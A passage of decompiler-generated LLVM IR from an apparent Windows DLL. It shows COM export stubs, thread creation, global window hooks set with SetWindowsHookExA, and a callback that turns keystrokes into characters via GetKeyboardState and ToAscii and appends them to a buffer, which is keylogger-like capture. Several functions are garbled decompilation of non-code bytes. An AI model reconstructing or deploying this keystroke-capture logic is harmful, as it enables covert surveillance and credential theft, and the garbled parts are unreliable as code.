dec_label_pc_404ed7:                              ; preds = %dec_label_pc_404e70, %dec_label_pc_404ed1
  %.reload = load i32, i32* %.reg2mem, !insn.addr !570
  ret i32 %.reload, !insn.addr !570
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404edc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !571
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !571
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !572
  %4 = inttoptr i32 %3 to i32*, !insn.addr !573
  %5 = load i32, i32* %4, align 4, !insn.addr !573
  %6 = icmp eq i32 %5, 0, !insn.addr !573
  %7 = icmp eq i1 %6, false, !insn.addr !574
  %8 = icmp eq i1 %7, false, !insn.addr !575
  br i1 %8, label %dec_label_pc_404f18, label %dec_label_pc_404eef, !insn.addr !575

dec_label_pc_404eef:                              ; preds = %dec_label_pc_404edc
  %9 = inttoptr i32 %0 to i8*, !insn.addr !576
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !577
  %11 = icmp eq i32* %10, null, !insn.addr !578
  %12 = icmp eq i1 %11, false, !insn.addr !579
  br i1 %12, label %dec_label_pc_404f18, label %dec_label_pc_404f02, !insn.addr !579

dec_label_pc_404f02:                              ; preds = %dec_label_pc_404eef
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4221960 to i32*), i32 0, i32* null), !insn.addr !580
  br label %dec_label_pc_404f18, !insn.addr !580

dec_label_pc_404f18:                              ; preds = %dec_label_pc_404f02, %dec_label_pc_404eef, %dec_label_pc_404edc
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !581
  store i32 0, i32* %15, align 4, !insn.addr !581
  ret i32 -2147221231, !insn.addr !582
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f44:
  ret i32 0, !insn.addr !583
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f48:
  ret i32 0, !insn.addr !584
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f4c:
  ret i32 0, !insn.addr !585
}

define i32 @function_404f50() local_unnamed_addr {
dec_label_pc_404f50:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !586
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !586
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !586
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !587
  %2 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !588
  %3 = add i32 %2, 1, !insn.addr !588
  store i32 %3, i32* @global_var_4096a0, align 4, !insn.addr !588
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !589
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !590
  ret i32 0, !insn.addr !591
}

define i32 @function_404f75() local_unnamed_addr {
dec_label_pc_404f75:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !592
  ret i32 %0, !insn.addr !592
}

define i32 @function_404f7a() local_unnamed_addr {
dec_label_pc_404f7a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !593
}

define i32 @function_404f7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f7c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !594
}

define i32 @function_404f80() local_unnamed_addr {
dec_label_pc_404f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !595
  %2 = add i32 %1, -1, !insn.addr !595
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !595
  ret i32 %0, !insn.addr !596
}

define i32 @function_404f88(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404f88:
  %esp.0.reg2mem = alloca i32, !insn.addr !597
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !598
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !598
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !598
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !599
  %4 = call i32 @function_4076ec(), !insn.addr !600
  %5 = icmp ne i32 %4, 0, !insn.addr !601
  %6 = icmp eq i1 %5, false, !insn.addr !602
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !603
  br i1 %6, label %dec_label_pc_405083, label %dec_label_pc_404fc5, !insn.addr !603

dec_label_pc_404fc5:                              ; preds = %dec_label_pc_404f88
  switch i32 %0, label %dec_label_pc_40500f [
    i32 8, label %dec_label_pc_404fd3
    i32 46, label %dec_label_pc_404ff2
  ]

dec_label_pc_404fd3:                              ; preds = %dec_label_pc_404fc5
  %7 = call i32 @function_407788(), !insn.addr !604
  %8 = call i32 @"@LStrDelete"(), !insn.addr !605
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !606
  br label %dec_label_pc_405083, !insn.addr !606

dec_label_pc_404ff2:                              ; preds = %dec_label_pc_404fc5
  %9 = call i32 @function_407788(), !insn.addr !607
  %10 = call i32 @"@LStrDelete"(), !insn.addr !608
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !609
  br label %dec_label_pc_405083, !insn.addr !609

dec_label_pc_40500f:                              ; preds = %dec_label_pc_404fc5
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !610
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !611
  %14 = udiv i32 %1, 65536, !insn.addr !612
  %15 = and i32 %14, 255, !insn.addr !613
  %16 = inttoptr i32 %15 to i16*, !insn.addr !614
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !615
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !616
  %19 = icmp eq i32 %18, 1, !insn.addr !617
  %20 = icmp eq i1 %19, false, !insn.addr !618
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !618
  br i1 %20, label %dec_label_pc_405083, label %dec_label_pc_40503b, !insn.addr !618

dec_label_pc_40503b:                              ; preds = %dec_label_pc_40500f
  %21 = call i32 @function_407450(), !insn.addr !619
  %22 = icmp eq i32 %21, 0, !insn.addr !620
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !621
  br i1 %22, label %dec_label_pc_405083, label %dec_label_pc_405047, !insn.addr !621

dec_label_pc_405047:                              ; preds = %dec_label_pc_40503b
  %23 = call i32 @function_4034c8(), !insn.addr !622
  %24 = icmp sgt i32 %23, 15, !insn.addr !623
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !623
  br i1 %24, label %dec_label_pc_405083, label %dec_label_pc_405058, !insn.addr !623

dec_label_pc_405058:                              ; preds = %dec_label_pc_405047
  %25 = call i32 @function_407788(), !insn.addr !624
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !625
  %27 = call i32 @"@LStrInsert"(), !insn.addr !626
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !626
  br label %dec_label_pc_405083, !insn.addr !626

dec_label_pc_405083:                              ; preds = %dec_label_pc_405058, %dec_label_pc_405047, %dec_label_pc_40503b, %dec_label_pc_40500f, %dec_label_pc_404ff2, %dec_label_pc_404fd3, %dec_label_pc_404f88
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !627
  %29 = load i32, i32* %28, align 4, !insn.addr !627
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !628
  %30 = add i32 %esp.0.reload, 8, !insn.addr !629
  %31 = inttoptr i32 %30 to i32*, !insn.addr !629
  store i32 4214947, i32* %31, align 4, !insn.addr !629
  %32 = call i32 @"@LStrClr"(), !insn.addr !630
  ret i32 %32, !insn.addr !631
}

define i32 @function_40509c() local_unnamed_addr {
dec_label_pc_40509c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !632
  ret i32 %0, !insn.addr !632
}

define i32 @function_4050a1() local_unnamed_addr {
dec_label_pc_4050a1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !633
}

define i32 @function_4050a3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050a3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !634
}

define i32 @function_4050ac(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050ac:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !635
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !635
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !635
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !636
  %2 = call i32 @function_4076ec(), !insn.addr !637
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !638
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !639
  %4 = add i32 %1, 8, !insn.addr !640
  %5 = inttoptr i32 %4 to i32*, !insn.addr !640
  store i32 4215154, i32* %5, align 4, !insn.addr !640
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !641
  ret i32 %6, !insn.addr !642
}

define i32 @function_40516b() local_unnamed_addr {
dec_label_pc_40516b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !643
  ret i32 %0, !insn.addr !643
}

define i32 @function_405170() local_unnamed_addr {
dec_label_pc_405170:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !644
}

define i32 @function_405172(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405172:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !645
}

define i32 @function_405178(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405178:
  %esp.0.reg2mem = alloca i32, !insn.addr !646
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !647
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !647
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !647
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !648
  %3 = call i32 @function_40765c(), !insn.addr !649
  %4 = icmp eq i32 %3, 0, !insn.addr !650
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !651
  br i1 %4, label %dec_label_pc_4051dc, label %dec_label_pc_405199, !insn.addr !651

dec_label_pc_405199:                              ; preds = %dec_label_pc_405178
  %5 = inttoptr i32 %0 to i8*, !insn.addr !652
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405200 to i32*), i8* null, i8* %5), !insn.addr !653
  %7 = ptrtoint i32* %6 to i32, !insn.addr !653
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !654
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !654
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !655
  %10 = icmp eq i1 %9, false, !insn.addr !656
  br i1 %10, label %dec_label_pc_4051d7, label %dec_label_pc_4051b4, !insn.addr !657

dec_label_pc_4051b4:                              ; preds = %dec_label_pc_405199
  %11 = call i32 @function_4074bc(), !insn.addr !658
  %12 = call i32 @"@LStrAsg"(), !insn.addr !659
  %13 = call i32 @function_4077e4(), !insn.addr !660
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !661
  br label %dec_label_pc_4051dc, !insn.addr !661

dec_label_pc_4051d7:                              ; preds = %dec_label_pc_405199
  %14 = call i32 @function_407918(), !insn.addr !662
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !662
  br label %dec_label_pc_4051dc, !insn.addr !662

dec_label_pc_4051dc:                              ; preds = %dec_label_pc_4051d7, %dec_label_pc_4051b4, %dec_label_pc_405178
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !663
  %16 = load i32, i32* %15, align 4, !insn.addr !663
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !664
  %17 = add i32 %esp.0.reload, 8, !insn.addr !665
  %18 = inttoptr i32 %17 to i32*, !insn.addr !665
  store i32 4215289, i32* %18, align 4, !insn.addr !665
  %19 = call i32 @"@LStrClr"(), !insn.addr !666
  ret i32 %19, !insn.addr !667
}

define i32 @function_4051f2() local_unnamed_addr {
dec_label_pc_4051f2:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !668
  ret i32 %0, !insn.addr !668
}

define i32 @function_4051f7() local_unnamed_addr {
dec_label_pc_4051f7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !669
}

define i32 @function_4051f9(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051f9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !670
}

define i32 @function_4051fd() local_unnamed_addr {
dec_label_pc_4051fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !671
  %8 = inttoptr i32 %4 to i8*, !insn.addr !671
  store i8 %7, i8* %8, align 1, !insn.addr !671
  %9 = add i32 %2, 111, !insn.addr !672
  %10 = inttoptr i32 %9 to i8*, !insn.addr !672
  %11 = load i8, i8* %10, align 1, !insn.addr !672
  %12 = load i32, i32* %eax, align 4, !insn.addr !672
  %13 = trunc i32 %12 to i8, !insn.addr !672
  %14 = add i8 %11, %13, !insn.addr !672
  store i8 %14, i8* %10, align 1, !insn.addr !672
  %15 = trunc i32 %3 to i16, !insn.addr !673
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !673
  %17 = inttoptr i32 %0 to i32*, !insn.addr !673
  store i32 %16, i32* %17, align 4, !insn.addr !673
  %18 = add i32 %0, 66, !insn.addr !674
  %19 = inttoptr i32 %18 to i64*, !insn.addr !674
  %20 = load i64, i64* %19, align 4, !insn.addr !674
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !674
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !675
  %22 = load i8, i8* %5, align 4, !insn.addr !676
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !676
  %25 = add i8 %22, %24, !insn.addr !676
  %26 = inttoptr i32 %23 to i8*, !insn.addr !676
  store i8 %25, i8* %26, align 1, !insn.addr !676
  %27 = add i32 %21, -117, !insn.addr !677
  %28 = inttoptr i32 %27 to i8*, !insn.addr !677
  %29 = load i8, i8* %28, align 1, !insn.addr !677
  %30 = trunc i32 %3 to i8, !insn.addr !677
  %31 = add i8 %29, %30, !insn.addr !677
  store i8 %31, i8* %28, align 1, !insn.addr !677
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !678
  %33 = add i32 %21, 16, !insn.addr !679
  %34 = inttoptr i32 %33 to i32*, !insn.addr !679
  %35 = load i32, i32* %34, align 4, !insn.addr !679
  %36 = add i32 %21, 12, !insn.addr !680
  %37 = inttoptr i32 %36 to i32*, !insn.addr !680
  %38 = load i32, i32* %37, align 4, !insn.addr !680
  %39 = add i32 %21, 8, !insn.addr !681
  %40 = inttoptr i32 %39 to i32*, !insn.addr !681
  %41 = load i32, i32* %40, align 4, !insn.addr !681
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !682
  %43 = inttoptr i32 %42 to i32*, !insn.addr !683
  %44 = load i32, i32* %43, align 4, !insn.addr !683
  %45 = icmp eq i32 %44, 0, !insn.addr !683
  %46 = icmp eq i1 %45, false, !insn.addr !684
  %47 = icmp eq i32 %41, 0, !insn.addr !685
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !686
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_405233, label %dec_label_pc_405262, !insn.addr !687

dec_label_pc_405233:                              ; preds = %dec_label_pc_4051fd
  store i32 %35, i32* %eax, align 4, !insn.addr !688
  %51 = add i32 %35, 4, !insn.addr !689
  %52 = inttoptr i32 %51 to i32*, !insn.addr !689
  %53 = load i32, i32* %52, align 4, !insn.addr !689
  switch i32 %53, label %dec_label_pc_405262 [
    i32 256, label %dec_label_pc_40524a
    i32 770, label %dec_label_pc_40525b
  ]

dec_label_pc_40524a:                              ; preds = %dec_label_pc_405233
  %54 = call i32 @function_404f88(i32 %2, i32 %1, i32 %0), !insn.addr !690
  br label %dec_label_pc_405262, !insn.addr !691

dec_label_pc_40525b:                              ; preds = %dec_label_pc_405233
  %55 = call i32 @function_4050ac(i32 %2, i32 %1, i32 %0), !insn.addr !692
  br label %dec_label_pc_405262, !insn.addr !692

dec_label_pc_405262:                              ; preds = %dec_label_pc_4051fd, %dec_label_pc_405233, %dec_label_pc_40525b, %dec_label_pc_40524a
  %56 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !693
  %57 = inttoptr i32 %35 to i32*, !insn.addr !694
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !694
  ret i32 %58, !insn.addr !695
}

define i32 @function_405278(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405278:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !696
  %5 = icmp eq i1 %4, false, !insn.addr !697
  %6 = icmp eq i32 %arg3, 0, !insn.addr !698
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_405296, label %dec_label_pc_4052a8, !insn.addr !699

dec_label_pc_405296:                              ; preds = %dec_label_pc_405278
  %8 = add i32 %arg1, 8, !insn.addr !700
  %9 = inttoptr i32 %8 to i32*, !insn.addr !700
  %10 = load i32, i32* %9, align 4, !insn.addr !700
  %11 = icmp eq i32 %10, 2, !insn.addr !701
  %12 = icmp eq i1 %11, false, !insn.addr !702
  br i1 %12, label %dec_label_pc_4052a8, label %dec_label_pc_4052a0, !insn.addr !702

dec_label_pc_4052a0:                              ; preds = %dec_label_pc_405296
  %13 = call i32 @function_405178(i32 %1, i32 %2, i32 %0), !insn.addr !703
  br label %dec_label_pc_4052a8, !insn.addr !703

dec_label_pc_4052a8:                              ; preds = %dec_label_pc_405278, %dec_label_pc_4052a0, %dec_label_pc_405296
  %14 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !704
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !705
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !705
  ret i32 %16, !insn.addr !706
}

define i32 @function_4052c0() local_unnamed_addr {
dec_label_pc_4052c0:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215308 to i32*), i32 3), !insn.addr !707
  %2 = ptrtoint i32* %1 to i32, !insn.addr !707
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !708
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215416 to i32*), i32 4), !insn.addr !709
  %5 = ptrtoint i32* %4 to i32, !insn.addr !709
  store i32 %5, i32* @global_var_4096ac, align 4, !insn.addr !710
  ret i32 %5, !insn.addr !711
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !712
  %1 = inttoptr i32 %0 to i32*, !insn.addr !713
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !713
  %3 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !714
  %4 = inttoptr i32 %3 to i32*, !insn.addr !715
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !715
  %6 = sext i1 %5 to i32, !insn.addr !715
  ret i32 %6, !insn.addr !716
}

define i32 @function_405310() local_unnamed_addr {
dec_label_pc_405310:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !717
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !717
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !717
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !718
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !719
  %3 = add i32 %2, 1, !insn.addr !719
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !719
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !720
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !721
  ret i32 0, !insn.addr !722
}

define i32 @function_405335() local_unnamed_addr {
dec_label_pc_405335:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !723
  ret i32 %0, !insn.addr !723
}

define i32 @function_40533a() local_unnamed_addr {
dec_label_pc_40533a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !724
}

define i32 @function_40533c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40533c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !725
}

define i32 @function_405340() local_unnamed_addr {
dec_label_pc_405340:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !726
  %2 = add i32 %1, -1, !insn.addr !726
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !726
  ret i32 %0, !insn.addr !727
}

define i32 @function_40534b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40534b:
  %storemerge.reg2mem = alloca i32, !insn.addr !728
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !728
  %5 = inttoptr i32 %3 to i32*, !insn.addr !728
  store i32 %4, i32* %5, align 4, !insn.addr !728
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !729
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !729
  %10 = add i8 %7, %9, !insn.addr !729
  %11 = inttoptr i32 %8 to i8*, !insn.addr !729
  store i8 %10, i8* %11, align 1, !insn.addr !729
  %12 = load i32, i32* %eax, align 4, !insn.addr !730
  store i32 %arg1, i32* %eax, align 4, !insn.addr !731
  %13 = add i32 %12, 99, !insn.addr !732
  %14 = inttoptr i32 %13 to i64*, !insn.addr !732
  %15 = load i64, i64* %14, align 4, !insn.addr !732
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !732
  %17 = add i32 %16, -2, !insn.addr !733
  %18 = inttoptr i32 %17 to i16*, !insn.addr !733
  store i16 27241, i16* %18, align 2, !insn.addr !733
  %19 = mul i32 %2, 2, !insn.addr !734
  %20 = add i32 %2, 110, !insn.addr !734
  %21 = add i32 %20, %19, !insn.addr !734
  %22 = inttoptr i32 %21 to i32*, !insn.addr !734
  %23 = load i32, i32* %22, align 4, !insn.addr !734
  %24 = sext i32 %23 to i64, !insn.addr !734
  %25 = mul nsw i64 %24, 111, !insn.addr !734
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !734
  %28 = icmp eq i64 %25, %27, !insn.addr !734
  br i1 %28, label %dec_label_pc_40537d, label %dec_label_pc_4053ec, !insn.addr !735

dec_label_pc_40537d:                              ; preds = %dec_label_pc_40534b
  %29 = icmp eq i32 %0, 0, !insn.addr !736
  br i1 %29, label %dec_label_pc_4053f4, label %dec_label_pc_405381, !insn.addr !737

dec_label_pc_405381:                              ; preds = %dec_label_pc_40537d
  %30 = icmp slt i32 %0, 0, !insn.addr !736
  br i1 %30, label %dec_label_pc_4053fc, label %dec_label_pc_405383, !insn.addr !738

dec_label_pc_405383:                              ; preds = %dec_label_pc_405381
  %31 = trunc i32 %0 to i8, !insn.addr !736
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !483, !insn.addr !736
  %33 = and i8 %32, 1, !insn.addr !736
  %34 = icmp eq i8 %33, 0, !insn.addr !736
  br i1 %34, label %dec_label_pc_4053b5, label %dec_label_pc_405385, !insn.addr !739

dec_label_pc_405385:                              ; preds = %dec_label_pc_405383
  %35 = add i32 %12, -1, !insn.addr !730
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !740
  %37 = load i32, i32* %36, align 4, !insn.addr !740
  %38 = xor i32 %37, %1, !insn.addr !740
  store i32 %38, i32* %36, align 4, !insn.addr !740
  %39 = add i32 %1, 959985462, !insn.addr !741
  %40 = inttoptr i32 %39 to i32*, !insn.addr !741
  %41 = load i32, i32* %40, align 4, !insn.addr !741
  %42 = xor i32 %41, %1, !insn.addr !741
  %43 = add i32 %16, -38, !insn.addr !742
  %44 = inttoptr i32 %43 to i32*, !insn.addr !742
  store i32 %35, i32* %44, align 4, !insn.addr !742
  %45 = add i32 %16, -42, !insn.addr !743
  %46 = inttoptr i32 %45 to i32*, !insn.addr !743
  store i32 %42, i32* %46, align 4, !insn.addr !743
  %47 = add i32 %16, -22, !insn.addr !744
  %48 = inttoptr i32 %47 to i32*, !insn.addr !744
  store i32 0, i32* %48, align 4, !insn.addr !744
  %49 = add i32 %16, -26, !insn.addr !745
  %50 = inttoptr i32 %49 to i32*, !insn.addr !745
  store i32 0, i32* %50, align 4, !insn.addr !745
  %51 = add i32 %16, -30, !insn.addr !746
  %52 = inttoptr i32 %51 to i32*, !insn.addr !746
  store i32 0, i32* %52, align 4, !insn.addr !746
  %53 = add i32 %16, -34, !insn.addr !747
  %54 = inttoptr i32 %53 to i32*, !insn.addr !747
  store i32 0, i32* %54, align 4, !insn.addr !747
  %55 = add i32 %16, -6, !insn.addr !748
  %56 = inttoptr i32 %55 to i32*, !insn.addr !748
  store i32 %arg3, i32* %56, align 4, !insn.addr !748
  %57 = add i32 %16, -46, !insn.addr !749
  %58 = inttoptr i32 %57 to i32*, !insn.addr !749
  store i32 %17, i32* %58, align 4, !insn.addr !749
  ret i32 0, !insn.addr !749

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !750
  %60 = trunc i64 %25 to i32, !insn.addr !734
  %61 = load i32, i32* %eax, align 4, !insn.addr !751
  %62 = add i32 %61, 1, !insn.addr !751
  %63 = mul i32 %59, 8, !insn.addr !752
  %64 = add i32 %59, 48, !insn.addr !752
  %65 = add i32 %64, %63, !insn.addr !752
  %66 = inttoptr i32 %65 to i8*, !insn.addr !752
  %67 = load i8, i8* %66, align 4, !insn.addr !752
  %68 = udiv i32 %62, 256, !insn.addr !752
  %69 = trunc i32 %68 to i8, !insn.addr !752
  %70 = add i8 %67, %69, !insn.addr !752
  store i8 %70, i8* %66, align 4, !insn.addr !752
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !753
  %71 = call i32 @"@LStrClr"(), !insn.addr !754
  %72 = call i32 @function_4034c8(), !insn.addr !755
  %73 = add i32 %60, -8, !insn.addr !756
  %74 = inttoptr i32 %73 to i32*, !insn.addr !756
  store i32 %72, i32* %74, align 4, !insn.addr !756
  %75 = ashr i32 %72, 31, !insn.addr !757
  %76 = zext i32 %72 to i64, !insn.addr !758
  %77 = zext i32 %75 to i64, !insn.addr !758
  %78 = mul i64 %77, 4294967296, !insn.addr !758
  %79 = or i64 %78, %76, !insn.addr !758
  %80 = sdiv i64 %79, 3, !insn.addr !758
  %81 = trunc i64 %80 to i32, !insn.addr !758
  store i32 %81, i32* %eax, align 4, !insn.addr !758
  %82 = srem i64 %79, 3, !insn.addr !758
  %83 = trunc i64 %82 to i32, !insn.addr !758
  %84 = icmp eq i32 %83, 0, !insn.addr !759
  %85 = icmp eq i1 %84, false, !insn.addr !760
  br i1 %85, label %dec_label_pc_4053eb, label %dec_label_pc_4053de, !insn.addr !760

dec_label_pc_4053de:                              ; preds = %dec_label_pc_4053b5
  %86 = load i32, i32* %74, align 4, !insn.addr !761
  %87 = ashr i32 %86, 31, !insn.addr !762
  %88 = zext i32 %86 to i64, !insn.addr !763
  %89 = zext i32 %87 to i64, !insn.addr !763
  %90 = mul i64 %89, 4294967296, !insn.addr !763
  %91 = or i64 %90, %88, !insn.addr !763
  %92 = sdiv i64 %91, 3, !insn.addr !763
  %93 = trunc i64 %92 to i32, !insn.addr !763
